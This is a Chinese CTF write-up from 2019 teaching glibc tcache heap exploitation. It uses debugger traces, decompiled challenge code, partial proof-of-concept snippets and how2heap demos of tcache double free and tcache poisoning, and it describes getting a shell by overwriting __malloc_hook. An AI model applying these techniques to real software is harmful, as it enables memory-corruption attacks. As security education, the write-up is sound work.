---
title: 在debug中学tcache
author: nepire
avatar: 'https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg'
authorLink: 'https://nepire.github.io/'
authorAbout: 逐梦者
authorDesc: 逐梦者
categories: 技术
comments: true
date: 2019-11-05 12:03:57
tags:
keywords:
description:
photos:
---
最近比赛Pwn的libc版本越来越多2.26以上的了，也就相当于多了不少tcache相关的题目，于是最近恶补了一波tcache机制相关的东西，并记录下tcache相关题目的调试

本文首发于先知社区[在Debug中学Tcache](https://xz.aliyun.com/t/3419)






### tcache简介

tcache（thread local caching）是glibc在2.26版本新出现的一种内存管理机制，它优化了分配效率却也降低了安全性，一些漏洞的利用条件变得容易了许多

首先我们先看下tcache新引入的两个数据结构tcache_entry 和tcache_perthread_struct

```c
/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache = NULL;
```

这里简单的说明一下tcache和fastbin的结构都很相像也都是单链表结构，明显的不同是fastbin每个bins有10个块而tcache是7个并且tcache的优先级要高于fastbin，相当于只有tcache放不下了才会放入fastbin

```c
(0x20)   tcache_entry[0]: 0x55ea7bc0d320 --> 0x55ea7bc0d300 --> 0x55ea7bc0d2e0 -->
 0x55ea7bc0d2c0 --> 0x55ea7bc0d2a0 --> 0x55ea7bc0d280 --> 0x55ea7bc0d260
```

我们先看下题目的基本信息，这里我是用了自己写的一个pwn环境来实现tcache的调试具体链接会在末尾放出

```bash
➜  tcache file children_tcache
children_tcache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ebf73572ad77a035a366578bf87c6aabc6a235a1, stripped
➜  tcache checksec children_tcache
[*] '/home/ctf/process/tcache/children_tcache'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

64位防护全开的程序，真的刺激，我们看下程序干了些什么

```bash
➜  tcache ./children_tcache
$$$$$$$$$$$$$$$$$$$$$$$$$$$
🍊    Children Tcache    🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. New heap           $
$   2. Show heap          $
$   3. Delete heap        $
$   4. Exit               $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice: 1
Size:12
Data:aaaa
```

一个基本的菜单类型的pwn题，在简单的审计过后就能发现漏洞，首先我们看下程序本身产生的问题

```c
void new()
{
  signed int i; // [rsp+Ch] [rbp-2034h]
  char *note_chunk; // [rsp+10h] [rbp-2030h]
  unsigned __int64 size; // [rsp+18h] [rbp-2028h]
  char buf; // [rsp+20h] [rbp-2020h]
  unsigned __int64 v4; // [rsp+2038h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(&buf, 0, 0x2010uLL);
  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
    {
      puts(":(");
      return;
    }
    if ( !note[i] )
      break;
  }
  printf("Size:");
  size = input();
  if ( size > 0x2000 )
    exit(-2);
  note_chunk = malloc(size);
  if ( !note_chunk )
    exit(-1);
  printf("Data:");
  read_chk_input(&buf, size);
  strcpy(note_chunk, &buf);
  note[i] = note_chunk;
  note_size[i] = size;
}
```

我们知道strcpy在拷贝字符串时连末尾的'\0'也会一起拷贝，假设我们的字符串长度刚好和所分配给它的长度相等，那么就可能会造成null-byte-off-by-one漏洞，我们简单的验证一下

```python
#poc
new(0x10,'a'*8)
new(0x110,'aaaa')
raw_input()

free(0)
new(0x18,'a'*0x18)
raw_input()
```

```bash
pwndbg> parseheap
addr                prev                size                 status              fd                bk
0x565258e29000      0x0                 0x250                Used                None              None
0x565258e29250      0x0                 0x20                 Used                None              None
0x565258e29270      0x0                 0x110                Used                None              None

pwndbg> parseheap
addr                prev                size                 status              fd                bk   
0x565258e29000      0x0                 0x250                Used                None              None
0x565258e29250      0x0                 0x20                 Freed 0x61616161616161610x6161616161616161
0x565258e29270      0x6161616161616161  0x100                Freed         0x62626262               0x0
Corrupt ?! (size == 0) (0x565258e29370)

```

```bash
pwndbg> x/8x 0x565258e29250
0x565258e29250:	0x0000000000000000	0x0000000000000021
0x565258e29260:	0x6161616161616161	0x0000000000000000
0x565258e29270:	0x0000000000000000	0x0000000000000111
0x565258e29280:	0x0000000062626262	0x0000000000000000

pwndbg> x/8x 0x565258e29250
0x565258e29250:	0x0000000000000000	0x0000000000000021
0x565258e29260:	0x6161616161616161	0x6161616161616161
0x565258e29270:	0x6161616161616161	0x0000000000000100   ==>这里原本应该为0x111但最末尾的0x11被0x00覆盖了
0x565258e29280:	0x0000000062626262	0x0000000000000000
```

由于这题的出题人用0xda填充整个chunk，所以我们不能直接伪造pre_size来overlapping

```c
void delete()
{
  unsigned __int64 idx; // [rsp+8h] [rbp-8h]

  printf("Index:");
  idx = input();
  if ( idx > 9 )
    exit(-3);
  if ( note[idx] )
  {
    memset(note[idx], 0xDA, note_size[idx]);
    free(note[idx]);
    note[idx] = 0LL;
    note_size[idx] = 0LL;
  }
  puts(":)");
}
```

但我们刚刚才验证的null byte off-by-one溢出的字节为\x00，所以我们可以通过反复的利用这个把pre_size位清0来构造overlapping

```python
#poc
new(0x10,'aaaa')
new(0x110,'aaaa')
free(0)
for i in range(8):
    new(0x10-i,'a'*(0x10-i))
    free(0)
raw_input()
```

```bash
pwndbg> parseheap
addr                prev                size                 status              fd                bk
0x560894f1f000      0x0                 0x20                 Freed 0x61616161616161610x6161616161616161
0x560894f1f020      0x130               0x100                Freed         0x61616161               0x0
Corrupt ?! (size == 0) (0x560894f1f120)
pwndbg> x/8x 0x560894f1f000
0x560894f1f000:	0x0000000000000000	0x0000000000000021
0x560894f1f010:	0x6161616161616161	0x6161616161616161
0x560894f1f020:	0x0000000000000130	0x0000000000000100
0x560894f1f030:	0x0000000061616161	0x0000000000000000
```

接着我们需要libc_base来方便后面的操作，我们可以看到在new中对size的检验范围十分大，这时我们可以通过unsort_bin_attack来泄露一个紧贴libc的地址 ，之后我们可以通过调试得到这个地址与libc_base的偏移，就相当与泄露出了libc_base

```c
printf("Size:");
  size = input();
  if ( size > 0x2000 )
    exit(-2);
  note_chunk = malloc(size);
```

我们简单的做个unsort_bin_attack尝试把这个地址写入到chunk上

```python
#poc
new(0x500,'aaaaa')
new(0x10,'bbbb')
free(1)
free(0)
```

```bash
pwndbg> parseheap
addr                prev                size                 status              fd                bk
0x55763fe59000      0x0                 0x250                Used                None              None
0x55763fe59250      0x0                 0x510                Freed     0x7f74dac85c78    0x7f74dac85c78
0x55763fe59760      0x510               0x20                 Used                None              None
pwndbg> x/8x 0x55763fe59250
0x55763fe59250:	0x0000000000000000	0x0000000000000511
0x55763fe59260:	0x00007f74dac85c78	0x00007f74dac85c78 <==
0x55763fe59270:	0x0000000000000000	0x0000000000000000
0x55763fe59280:	0xdadadadadadadada	0xdadadadadadadada
```

有了这些条件后我们便可以去泄露libc了，我们用图演示下流程

![1542258403288](https://raw.githubusercontent.com/Nepire/Nepire.github.io/master/_posts/%E6%8A%95%E7%A8%BF__%E5%9C%A8DEBUG%E4%B8%AD%E5%AD%A6%E4%B9%A0tcache%E6%9C%BA%E5%88%B6.assets/1542258403288.png)

```bash
#free before
pwndbg> parseheap
addr                prev                size                 status              fd                bk
0x55a2d6e3a000      0x0                 0x250                Used                None              None
0x55a2d6e3a250      0x0                 0x510                Freed     0x7fba63b37c78    0x7fba63b37c78
0x55a2d6e3a760      0x510               0x30                 Freed 0x61616161616161610x6161616161616161
0x55a2d6e3a790      0x540               0x500                Used                None              None
0x55a2d6e3ac90      0x0                 0x20                 Used                None              None
pwndbg> x/8x 0x55a2d6e3a760
0x55a2d6e3a760:	0x0000000000000510	0x0000000000000030
0x55a2d6e3a770:	0x6161616161616161	0x6161616161616161
0x55a2d6e3a780:	0x6161616161616161	0x6161616161616161
0x55a2d6e3a790:	0x0000000000000540	0x0000000000000500
pwndbg> x/8x 0x55a2d6e3a790
0x55a2d6e3a790:	0x0000000000000540	0x0000000000000500
0x55a2d6e3a7a0:	0x0000000063636363	0x0000000000000000
0x55a2d6e3a7b0:	0x0000000000000000	0x0000000000000000
0x55a2d6e3a7c0:	0x0000000000000000	0x0000000000000000

#free after
pwndbg> parseheap
addr                prev                size                 status              fd                bk
0x563204289000      0x0                 0x250                Used                None              None
0x563204289250      0x0                 0xa40                Freed     0x7f01905acc78    0x7f01905acc78
0x563204289c90      0xa40               0x20                 Used                None              None
pwndbg> x/8x 0x563204289250
0x563204289250:	0x0000000000000000	0x0000000000000a41
0x563204289260:	0x00007f01905acc78	0x00007f01905acc78
0x563204289270:	0x0000000000000000	0x0000000000000000
0x563204289280:	0xdadadadadadadada	0xdadadadadadadada
pwndbg>
```

 这时我们再新建一个chunk分配大小和chunk0一样时，chunk就会分配到chunk0所在的位置，这时我们show(0)即可leak_libc

这样我们所有的前置工作就做好了，接着就是通过tcache_dup和tcache_poisoning来getshell了

首先我们先通过how2heap了解下

```c
#include <stdio.h>
#include <stdlib.h>
//tcache_dup
int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");

	fprintf(stderr, "Allocating buffer.\n");
	int *a = malloc(8);

	fprintf(stderr, "malloc(8): %p\n", a);
	fprintf(stderr, "Freeing twice...\n");
	free(a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));

	return 0;
}
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
// tcache poisoning
int main()
{
	"This file demonstrates a simple tcache poisoning attack by tricking malloc into"
	"returning a pointer to an arbitrary location (in this case, the stack)."
	"The attack is very similar to fastbin corruption attack."

	size_t stack_var;
	fprintf(stderr, "The address we want malloc() to return is %p.\n", (char *)&stack_var);

	"Allocating 1 buffer."
	intptr_t *a = malloc(128);
	fprintf(stderr, "malloc(128): %p\n", a);
	"Freeing the buffer..."
	free(a);

	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
	a[0] = (intptr_t)&stack_var;

	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);

	intptr_t *b = malloc(128);
	fprintf(stderr, "2nd malloc(128): %p\n", b);
	"We got the control"
	return 0;
}
```

我们可以很明显的感受到tcache_dup就是弱化版的fastbin_double_free，我们先看一下源码相关的函数

```c
tcache_put (mchunkptr chunk, size_t tc_idx)
{
      tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
      assert (tc_idx < TCACHE_MAX_BINS);
      e->next = tcache->entries[tc_idx];
      tcache->entries[tc_idx] = e;
      ++(tcache->counts[tc_idx]);
}
```

这就是我之前所说过引入tcache机制降低了安全性的一个体现，本来应该要有tcache->counts[tc_idx] 的相关检验，却为提升效率而去掉了，这也侧面的说明安全和性能处在一个此消彼长的状态

我们简单的调试下tcache_dup

```bash

pwndbg> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55a661cd5270 (size : 0x20d90)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x20)   tcache_entry[0]: 0x55a661cd5260 --> 0x55a661cd5260 (overlap chunk with 0x55a661cd5250(freed) )

```

我们直接free两次同一个chunk，就能直接得到两个指向同一块内存区域的指针，这无疑比正常在fastbin下的double free简易许多

接着我们看下tcache_poisoning，简单来说tcache_poisoning就是一个通过覆盖tcache_next就直接可以malloc到任意地址去将其覆盖为one_gadget或是别的东西去进行利用的一个很万金油的用法，我们调试下how2heap给的程序

```bash
pwndbg> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55a464be82e0 (size : 0x20d20)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x55a464be8260

```

它先往tcache里面放了一个0x80的chunk，然后我们再看下修改了tcache_next后的tcache_entry是怎么样的

```bash
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────
   20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
   23 	a[0] = (intptr_t)&stack_var;
   24
 ► 25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
   26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27
   28 	intptr_t *b = malloc(128);
   29 	fprintf(stderr, "2nd malloc(128): %p\n", b);
   30 	fprintf(stderr, "We got the control\n");
────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ rdx rsp  0x7ffe99bc1bb0 —▸ 0x55a4635689a0 (__libc_csu_init) ◂— push   r15
01:0008│          0x7ffe99bc1bb8 —▸ 0x55a464be8260 —▸ 0x7ffe99bc1bb0 —▸ 0x55a4635689a0 (__libc_csu_init) ◂— push   r15
02:0010│          0x7ffe99bc1bc0 —▸ 0x7ffe99bc1cb0 ◂— 0x1
03:0018│          0x7ffe99bc1bc8 ◂— 0xad94ca33a5db2a00
04:0020│ rbp      0x7ffe99bc1bd0 —▸ 0x55a4635689a0 (__libc_csu_init) ◂— push   r15
05:0028│          0x7ffe99bc1bd8 —▸ 0x7f6dd0a631c1 (__libc_start_main+241) ◂— mov    edi, eax
06:0030│          0x7ffe99bc1be0 ◂— 0x40000
07:0038│          0x7ffe99bc1be8 —▸ 0x7ffe99bc1cb8 —▸ 0x7ffe99bc2912 ◂— 0x74632f656d6f682f ('/home/ct')
pwndbg> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55a464be82e0 (size : 0x20d20)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x55a464be8260 --> 0x7ffe99bc1bb0 --> 0x55a4635689a0
```

我们可以看见设置的栈地址放在了tcache_entry的第二个堆，这时我们只要new两个0x80大小的chunk就可以控制tcache_next所在的空间

我们拿个例题来看看，这是山东省科来杯的一道简单pwn题，由于他给的libc就叫libc-2.27所以我们直接用ubuntu18.04的环境去调试，首先我们先看下题目的基本信息

```bash
➜  bbtcache file bb_tcache
bb_tcache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=642e76244eb176cccd3e281014f18a7ea7551682, stripped
➜  bbtcache checksec bb_tcache
[*] '/home/Ep3ius/pwn/process/bbtcache/bb_tcache'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

我们接着反编译分析一下题目

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  unsigned int i; // [rsp+Ch] [rbp-14h]
  int choice; // [rsp+10h] [rbp-10h]
  void *chunk; // [rsp+18h] [rbp-8h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  i = 0;
  puts("Welcome to easy heap game!");
  printf("I think you might need this: 0x%016llx\n", &system);
  while ( i != 7 )
  {
    menu(++i);
    choice = fgets_input();
    if ( choice == 2 )                          // free
    {
      free(chunk);
    }
    else if ( choice == 3 )                     // write
    {
      puts("You might need this to tamper something.");
      read(0, chunk, 8uLL);
    }
    else
    {
      if ( choice != 1 )                        // new
        exit(0);
      chunk = malloc(0x10uLL);
    }
  }
  puts("Game over!");
  exit(0);
}
```

程序逻辑十分清晰，一共七次机会进行new、free、write的操作来getshell，由于除了次数没有任何限制，所以我们能很直接的体会到tcache机制所带来的安全方面问题，我们先做个标准的tcache_poisoning起手式，先放一个堆块到tcache_entry

```bash
pwndbg> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x556b70596270 (size : 0x20d90)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x20)   tcache_entry[0]: 0x556b70596260
```

接着我们通过write操作去修改一下tcache_next为&malloc_hook

```bash
pwndbg> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x556b70596270 (size : 0x20d90)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x20)   tcache_entry[0]: 0x556b70596260 --> 0x7f2d9da10c10 (&__malloc_hook)
```

接着new两次把tcache从取出并把malloc_hook修改成one_gadget后new一个新chunk触发malloc_hook就可以getshell了，很简单又直接的题目吧。

我们回到children_tcache，先做个tcache_dup，也就是对我们之前插在两个unsort_bin中间的chunk进行两次free

```bash
pwndbg> parseheap
addr                prev                size                 status              fd                bk
0x564f27df9000      0x0                 0x250                Used                None              None
0x564f27df9250      0x0                 0x510                Used                None              None
0x564f27df9760      0x510               0x30                 Used                None              None
0x564f27df9790      0xdadadadadadadada  0x4f0                Freed     0x7fa26b599c78    0x7fa26b599c78
0x564f27df9c80      0x4f0               0x20                 Used                None              None
pwndbg> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x556e12172ca0 (size : 0x20360)
       last_remainder: 0x556e12172790 (size : 0x4f0)
            unsortbin: 0x556e12172790 (size : 0x4f0)
(0x30)   tcache_entry[1]: 0x556e12172770
pwndbg>
```

接着我们只要free(2)就相当于获得了两个指向0x556e12172770的指针

```bash
pwndbg> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x556e12172ca0 (size : 0x20360)
       last_remainder: 0x556e12172790 (size : 0x4f0)
            unsortbin: 0x556e12172790 (size : 0x4f0)
(0x30)   tcache_entry[1]: 0x556e12172770 --> 0x556e12172770 (overlap chunk with 0x556e12172760(freed) )
```

接着我们就可以new一个新tcache里面存放malloc_hook然后通过tcache_poisoning就可以把malloc_hook修改为one_gadget，再new一个新chunk就可以getshell了。

在不断的挖掘tcache机制就会遇到更多更有意思的东西，虽然降低安全性但也变得更加有趣了(滑稽)


感谢M4x师傅，kirin师傅，Hpasserby师傅的知识分享

相关链接

调试环境 : [nepire-pwn](https://github.com/Nepire/nepire-pwn)  (将~/nepire-pwn/DOCKER/Dockerfile第一行的16.04 换成17.10或更高即可调试tcache)

调试器：[PWNDBG](https://github.com/Nepire/Pwngdb)
